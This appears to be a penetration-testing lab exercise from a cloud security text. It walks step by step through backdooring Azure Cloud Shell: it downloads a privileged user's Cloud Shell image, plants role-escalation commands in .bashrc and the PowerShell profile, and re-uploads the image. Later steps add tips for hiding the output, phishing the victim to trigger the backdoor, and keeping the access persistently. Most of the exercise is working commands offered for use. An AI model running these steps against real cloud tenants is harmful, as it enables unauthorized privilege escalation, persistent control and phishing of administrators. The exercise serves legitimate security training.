


### Hands-on exercise – Backdooring Azure Cloud Shell
In this exercise, we will exploit a Cloud Shell volume image to run sensitive commands with the permissions of a privileged user when they use Cloud Shell. This will ensure privilege access persistence. The process that we will cover will follow a four-step process. 
* First, we will download the Cloud Shell volume image of a higher privileged user
* We will mount the image on the Linux VM that we deployed earlier
* We will plant commands that we want to run
* We will re-upload back into the Cloud Shell file share

1. Open a PowerShell console on your pentest VM. SSH into the Linux VM that you used in the previous exercise **`LAB07`**. Enter the password when prompted.
```
ssh linuxadmin@linuxvm-xxxxxxxxxxxxxxxxxxxxxx
```

2. In the Bash shell of the pentest Linux VM, use the following command to switch to the root user:
```
sudo su –
```

3. Authenticate to Azure CLI using the following command. Replace the **`AVA_USERNAME`** and **`AVA_PASSWORD`** placeholders with the real values of Ava's credentials from the **`LABXX-Info`** exercise file:
```
az login --username "AVA_USERNAME" --password "AVA_PASSWORD"
```

4. Run lava.py to start the Lava tool:
```
cd lava/
python3 lava.py
```

5. Verify the current user and permissions using the following command:
```
exec priv_show
```

6. Scan the file shares in the Azure subscription for potential Cloud Shell images. You can do this using the following Lava command:
```
exec stg_file_scan
```

7. The previous command takes advantage of access to the access keys to scan the file shares in an Azure subscription. You can see that we have a file share that is used by Azure Cloud Shell:

8. Download the files in the Azure file shares using the following command. Running the preceding command in an environment that has multiple file shares can take a long time to complete:
```
exec stg_file_download
```

9. This will download the file into a temporary directory on the pentest Linux VM. Make a note of the download location where it says **`files will be saved to.....`**:

10. After the download has been completed, exit Lava using the exit command:
```
exit
```

11. Back in the Bash shell, mount the downloaded image file using the following command. Replace **`<download_location>`** with the download path that you made a note of in step 9 of this exercise:
```
mount <download_location>/.cloudconsole/acc_admin.img /mnt
```

12. Explore the mounted drive by typing the following command and pressing Tab:
```
ls /mnt/
```

13. You should see an output of persistent files and data from the Cloud Shell user's previous sessions. This includes sensitive information, such as the user's shell context information.

14. Change directories to the mounted drive and enter the following command to append a malicious command to the .bashrc file, to escalate the privileges of our current Contributor user:
```
cd /mnt
echo "az role assignment create --role "Owner" --assignee $(az ad user list --display-name ava.brown | jq '.[]' | jq -r '.userPrincipalName')" >> .bashrc
```

15. **`bashrc`** is a Bash shell script that runs whenever a shell session is started interactively. The preceding command will ensure that the next time the target privileged user opens a Cloud Shell session, the command to escalate the privilege of the Ava from **`contributor`** access to **`owner`** access will be executed. 

16. To do the same thing for a PowerShell session, we will need to first create two directories in the user's home directory. This is where the PowerShell profile will live. If you get an error message about the existence of the directories, you can ignore that and move on to the next step:
```
mkdir .config
mkdir .config/PowerShell
```

17. Similar to what we did for the .bashrc file, we will make the contributoruser an owner on the subscription by adding the following command to the PowerShell profile:
```
echo "New-AzRoleAssignment -UserPrincipalName (Get-AzADUser -StartsWith ava).UserPrincipalName -RoleDefinitionName Owner" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1
```

18. Unmount the drive from your session with the following command:
```
cd ..
umount /mnt
```

19. Now let's upload the drive back to the storage account and overwrite the existing version. First, we will obtain the name of the storage account and store it in a variable. Replace **`<storage_acct_name>`** with the name of the storage account that the original Cloud Shell files were downloaded from (starts with a prefix of **`cs`**):
```
az storage account list --query [].name -o tsv
storagename=<storage_acct_name>
```

20. Obtain the access key and file share and upload the image back into it using the following commands. Replace **`<download_location>`** with the location that you made a note of in **`Step 9`** of this exercise:
```
key=$(az storage account keys list -n $storagename --query [0].value -o tsv)

csfileshare=$(az storage share list --account-key $key --account-name $storagename --query [].name -o tsv)

az storage file upload --account-key $key --account-name $storagename --share-name $csfileshare --path ".cloudconsole/acc_admin.img" --source "<download_location>/.cloudconsole/acc_admin.img"
```

21. The upload process will begin after this. This will overwrite the existing file in the share. 

22. Finally, we will need to trigger the attack by opening a Cloud Shell instance as the **`admin`** user account. To do this, we will log in as the **`admin`** account and open Cloud Shell in the portal. We can see that our commands were executed in the Cloud Shell instance, and Ava's account is now an owner on the subscription.

23. As an attacker, we may want to be a little stealthier about our actions in this scenario. To suppress the message, you can use the **`| out-null`** function at the end of the PowerShell command to redirect the output. Alternatively, we can use **`&>/dev/null`** at the end of the Bash shell attack. This will prevent the command execution from showing up in your admin's Cloud Shell output.

24. In a practical attack scenario, it may take a while for a victim Cloud Shell account to open a new session. To expedite this process, you could send a phishing email that links to https://shell.azure.com/. Not only will the link look legitimate, but it will start up a Cloud Shell session as soon as the site is loaded.

25. Now let's verify that we have indeed escalated our privileges to the Owner role. We can run the priv_show command in Lava to verify this:
```
cd ~/lava
python3 lava.py
exec priv_show
```

26. You should be able to see that the user is now assigned to the OWNER role due to a successful privilege escalation attack. This also ensures that if the permission was removed from the user, it will be re-added the next time the user opens a Cloud Shell session - essentially giving us persistence.
